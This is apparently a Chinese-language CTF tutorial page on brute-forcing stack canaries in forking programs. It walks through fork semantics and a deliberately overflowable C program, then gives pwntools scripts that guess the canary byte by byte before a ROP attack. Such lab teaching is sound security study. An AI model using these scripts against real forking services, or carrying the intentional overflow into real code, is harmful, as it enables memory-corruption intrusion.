---
title: "Canary爆破"
description: ""
lead: ""
date: 2023-06-01T20:48:01+08:00
lastmod: 2023-06-01T20:48:01+08:00
draft: false
images: []
menu:
  docs:
    parent: ""
    identifier: "canary_blast-f1811e695c8c16cce8cf8990a4357027"
weight: 5
toc: true
---

## 0x01 介绍

Canary能够爆破的情况非常少，必要条件有两点：

1. 多次触发stack smash
2. 触发了stack smash也不会退出整个程序的运行

能实现这样条件的大概只有循环+fork子进程，fork函数可以创建一个和原进程一样的进程，然后原进程和这个新建的进程会同时执行接下来的代码。fork函数返回值有三种类型，第一种为0，即当前进程是子进程，第二种是大于0，表示当前进程为父进程，第三种为小于0表示fork失败。举个例子来说

```cpp
#include<stdio.h>
#include<unistd.h>
int main() {
    pid_t pid = fork();    // 子进程和父进程将会同时执行以下代码
    if(pid == 0) {
        printf("this is a child process\n");
    } else if(pid > 0) {
        printf("this is a father process\n");
    } else {
        printf("fork error\n");
    }
    return 0;
}
// gcc fork_test.c -o fork_test
```

pid等于0的情况和大于0的情况都会被运行到，对于子进程来说fork的返回值是0，而对于父进程来说fork的返回值是大于0的，然后子进程和父进程会并行运行，两种情况都会被打印出来。

![8f91d6e3a7afcb790d88e94edf881ffb](images/8f91d6e3a7afcb790d88e94edf881ffb.png)  

子进程和父进程哪个先被执行是由操作系统调度决定的。了解了fork是如何运行的，接下来看一个典型的题目

```cpp
#include<stdio.h>
#include<unistd.h>
#include<sys/wait.h>

void run() {
        char buf[0x10];
        read(0, buf, 0x50);
}

int main() {
        pid_t pid;
        puts("Canary blast");
        while(1) {
                pid = fork();
                if(pid > 0) {
                        wait(0);    // 等待子进程资源回收，即不执行父进程
                } else if(pid == 0) {
                        run();
                        puts("done");
                } else {
                        break;
                }
        }
        return 0;
}
// gcc canary_blast.c -o canary_blast -no-pie -fstack-protector
```

这个函数是满足canary爆破的两个条件的，首先fork函数创建的子进程复制了父进程的canary，两者的canary是一样的，其次fork的子进程被stack smash，也不会破坏父进程的while循环fork新子进程。

然后我们就可以在子进程里逐个覆盖canary的字节来看它会不会stack smash，如果没有stack smash则表明这个字节猜对了，反之则继续猜，对于32位来说最多需要猜3\*0xff次，而64位最多需要猜7\*0xff次，每个字节的值在0~0xff之间。为什么不是满一个栈单元，因为末尾的 `\x00` 字节是确定的。

我们尝试爆破一个字节来试试。攻击代码为

```python
from pwn import*
context.log_level = 'debug'
o = process("./canary_blast")
canary = [0x00]
for i in range(0xff):
    payload = b'a'*24 + p8(canary[0]) + p8(i)
    o.sendline(payload)
    res = o.recv(timeout = 1)
    if "done" in res.decode():
        print("the 7th is %02x" % (i))
        canary.append(i)
        break
o.interactive()
```

![37dff5ad2451fa5f9be0c5a634aa95d0](images/37dff5ad2451fa5f9be0c5a634aa95d0.png)  

运行后可以看到canary的第7个字节为0x77，这时候我们可以gdb附加来看一下canary的值是否一样

![bc4cc90886e9720a6a4b5688c2e9cf79](images/bc4cc90886e9720a6a4b5688c2e9cf79.png)  

可以看到是一样的，接下来的操作为把爆破出来的字节添加到payload里，爆破下一个字节，直到所有字节都被爆破出来为止，攻击脚本也比较简单

```python
from pwn import*
context.log_level = 'debug'
o = process("./canary_blast")
canary = [0x00]
i = 0
while i < 7:
    for x in range(0xff):
        payload = b'a'*24
        for y in canary:
            payload += p8(y)
        payload += p8(x)
        o.send(payload)
        res = o.recv(timeout = 1)
        if "done" in res.decode():
            print("the 7th is %02x" % (x))
            canary.append(x)
            break
    i += 1
print("canary is ", end="")
for i in range(8):
    print("%02x" % (canary[7-i]), end="")
print()
o.interactive()
```

![12bc70b5d94551e5ee64036d339452a1](images/12bc70b5d94551e5ee64036d339452a1.png)  

![ac5fdf02c6995eb5f39c414db7139a02](images/ac5fdf02c6995eb5f39c414db7139a02.png)

接下来就是普通的ROP攻击了
